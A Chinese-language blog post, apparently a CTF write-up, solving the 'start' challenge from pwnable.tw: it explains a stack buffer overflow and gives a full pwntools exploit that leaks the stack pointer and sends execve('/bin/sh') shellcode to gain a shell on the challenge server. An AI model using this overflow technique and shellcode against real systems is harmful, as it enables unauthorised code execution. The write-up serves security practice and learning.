---
title: pwnable.tw(持续更新。。。)
date: 2018-04-20 01:09:14
tags: PWN

---

## 0x00 前言

好久没刷PWN了，欸，最近感觉自己挺急功近利的

题目网址：https://pwnable.tw/

2018/4/20  01点15分

<!--more-->

## 0x01 start

又给自己挖坑，前面还有几个坑没补，诶，慢慢来好了

来看题

{%asset_img 0.png%}

一道常规的栈溢出题，先调用write将Let's start the CTF:输入到标准输出，也就是输到屏幕上，然后再调用read函数将输入的值到缓冲区，那么就是这里能够产生溢出

exp:

```
from pwn import*

r = remote('chall.pwnable.tw', 10000)

r.recv()

payload1 = 'a'*20+p32(0x8048087) #返回到0x8048087为了打印出原始的esp值

r.send(payload1)

data = u32(r.recv()[:4]) #得到最原始的esp值

shellcode_offset = 20    #根据data算出距离shellcode的偏移

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73"\
            "\x68\x68\x2f\x62\x69\x6e\x89"\
            "\xe3\x89\xc1\x89\xc2\xb0\x0b"\
            "\xcd\x80\x31\xc0\x40\xcd\x80"

payload2 = 'a'*20+p32(data+20)+shellcode  #跳转到执行shellcode

r.send(payload2)

r.interactive()

```

运行得到flag

{%asset_img 1.png%}

